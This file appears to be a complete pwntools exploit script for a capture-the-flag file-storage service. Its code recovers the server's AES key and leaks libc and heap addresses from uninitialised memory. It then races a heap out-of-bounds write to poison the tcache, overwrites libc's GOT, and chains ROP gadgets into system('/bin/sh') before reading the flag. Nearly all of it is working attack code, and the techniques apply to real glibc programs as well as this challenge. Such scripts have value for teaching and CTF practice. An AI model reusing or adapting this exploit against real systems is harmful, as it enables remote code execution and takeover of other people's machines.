from pwn import *
from Crypto.Cipher import AES
from hashlib import md5

"""
"""

# context.log_level = 'debug'
context.arch = 'amd64'
context.word_size = 64
if os.getenv('RUNNING_IN_DOCKER'):
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h', '-p', '75']
else:
    gdb.binary = lambda: 'gef'
    context.terminal = ['alacritty', '-e', 'zsh', '-c']

sla  = lambda r, s: conn.sendlineafter(r, s)
sl   = lambda    s: conn.sendline(s)
sa   = lambda r, s: conn.sendafter(r, s)
se   = lambda s: conn.send(s)
ru   = lambda r, **kwargs: conn.recvuntil(r, **kwargs)
rl   = lambda : conn.recvline()
uu32 = lambda d: u32(d.ljust(4, b'\x00'))
uu64 = lambda d: u64(d.ljust(8, b'\x00'))

def store_file(name, size, contents):
    sla(b'Choice> ', b'1')
    sla(b'Filename> ', name)
    sla(b'File size> ', str(size).encode())
    sla(b'File contents> ', contents)

def retrieve_file(idx):
    sla(b'Choice> ', b'2')
    sla(b'File index> ', str(idx).encode())

def aes_dec(blk):
    aes = AES.new(SERVER_KEY, AES.MODE_ECB)
    return aes.decrypt(blk)

def forge_pt(target_ct, prev_pt, iv):
    # find a plaintext which will encrypt the the target ct
    # given the prev_pt blocks that precede it and the iv
    aes = AES.new(SERVER_KEY, AES.MODE_CBC, iv)
    last_ct = aes.encrypt(prev_pt)
    last_ct_blk = last_ct[-16:]
    target_blks = [target_ct[i:i+16] for i in range(0, len(target_ct), 16)]
    out = b''
    for blk in target_blks:
        out += xor(last_ct_blk, aes_dec(blk))
        last_ct_blk = blk
    return out

def mangle_pointer(addr, val):
    return val ^ (addr >> 12)

IS_REMOTE = 1
def connect():
    if IS_REMOTE:
        return remote('0.0.0.0', 1337)
    return process([exe.path])

libc = ELF('../src/libc.so.6')
exe = ELF("../src/chall")

TARGET_USER = b'zxcvzxcv'

# init new group and register the target user
# this is also the victim connection where we will get code exec
victim_conn = connect()
conn = victim_conn
sla(b'> ', b'')
GROUP = rl().split(b': ')[1].strip(b'\n')
log.info(f'GROUP = {GROUP.decode()}')
sla(b'Username> ', TARGET_USER)
ru(b'password is: ')
TARGET_PASS = bytes.fromhex(rl().decode().strip())

# register new user to get encryption of password xor padding_block which is
# the overwritten server key
conn = connect()
sla(b'> ', GROUP)
sla(b'Username> ', xor(TARGET_PASS, b'\x10' * 0x10))
ru(b'password is: ')
SERVER_KEY = bytes.fromhex(rl().decode().strip())
log.success(f'SERVER_KEY = {SERVER_KEY.hex()}')
conn.close()

# setup attacker connection which will trigger the race overflow
attacker_conn = connect()
conn = attacker_conn
sla(b'> ', GROUP)
sla(b'Username> ', TARGET_USER)
sla(b'Password> ', TARGET_PASS.hex().encode())

# get a libc leak with uninitialised heap memory by creating an unsorted bin
# chunk
conn = victim_conn
store_file(b'1leak', 2000, b'x')
store_file(b'1leak', 2000, b'x')

conn = attacker_conn
retrieve_file(0)
leak = ru(b'1. Store file', drop=True)
libc_leak = u64(leak[8:8+8])
libc_base = libc_leak - 0x21ace0
log.success(f'libc base: {hex(libc_base)}')
libc.address = libc_base

# get a heap leak with uninitialised heap memory
conn = victim_conn
sleep(1)
store_file(b'0leak', 0x60, b'')
retrieve_file(1)
leak = ru(b'1. Store file', drop=True)
heapleak = u64(leak[16:16+8])
heapbase = heapleak - 0x12240
log.success(f'heap base: {hex(heapbase)}')

# prepare file that will read into tcachebin (idx=3, size=0x50) (+0x6f0)
# to overflow a tcache entry in bin (idx=8, size=0xa0) (+0xb30)
conn = attacker_conn
store_file(b'2oob', 0x30, b'x' * 0x30)

# heap oob write in victim connection
# get the file stat ready but don't read yet
conn = victim_conn
sleep(1) # give time for fflush
sla(b'Choice> ', b'2')

# "quickly" increase the size of the file to overflow in adjacent free chunk that
# is in the tcachebin (idx=8, size=0xa0)
# our payload will set the fd ptr of the first tcache[8] entry to somewhere
# that we want to write to
conn = attacker_conn
libc_got = libc.address + libc.dynamic_value_by_tag('DT_PLTGOT')
write_target = libc_got
iv = md5(b'2oob' + b'\x00' * 12).digest()
payload = flat([
    b'x' * 0x30,
    forge_pt(
        flat([
            p64(0),
            p64(0x20001), # top chunk
            b'B' * (0x3f8 - 2*0x8),
            p64(0xa1), # size
            p64(mangle_pointer(heapbase+0x15dd0, write_target)), # fd ptr
            b'D' * (0x500 - 0x30 - 0x3f8 - 2*0x8 - 6*0x8),
            b'Y' * 0x30, # fake chunk that will be free'd
        ], length=0x500-0x30),
        b'x' * 0x30,
        iv
    )
])
store_file(b'2oob', 0x500, payload)

# prepare file within attacker conn which will be written to the arb address
# when retrieved from the victim conn
# we'll use libc got hijacking technique for code exec
# https://github.com/n132/Libc-GOT-Hijacking/blob/main/Pre/templates.md#pos6
libc_rop = ROP(libc)
plt0 = libc.address + libc.get_section_by_name('.plt').header.sh_addr
escape = libc.address + 0x16bc0b
rop_chain = [
    libc_rop.rdi.address,
    next(libc.search(b"/bin/sh")),
    libc_rop.rax.address,
    libc.sym["system"]
]
nudge = 1
payload = flat([
    p64(0),
    libc_got + 0x18,
    libc_rop.rsp.address,
    rop_chain,
    libc_rop.rsi.address,
    plt0,
    escape,
    libc_got + 0x3000 - nudge * 8
])
log.info(f'libc hijacking got payload: {payload.hex()} {hex(len(payload))}')
store_file(b'3arbw', 0x80, payload)

# trigger heap oob to poison tcache
conn = victim_conn
log.info('triggering heap OOB')
files = [rl() for _ in range(3)]
idx = next(f[:1] for f in files if b'2oob' in f)
sla(b'File index> ', idx)

# trigger the arb write and shell
log.info('triggering arb write')
sla(b'Choice> ', b'2')
files = [rl() for _ in range(4)]
idx = next(f[:1] for f in files if b'3arbw' in f)
sla(b'File index> ', idx)

log.success('shell?')

sl(b'cat flag.txt')

conn.interactive()
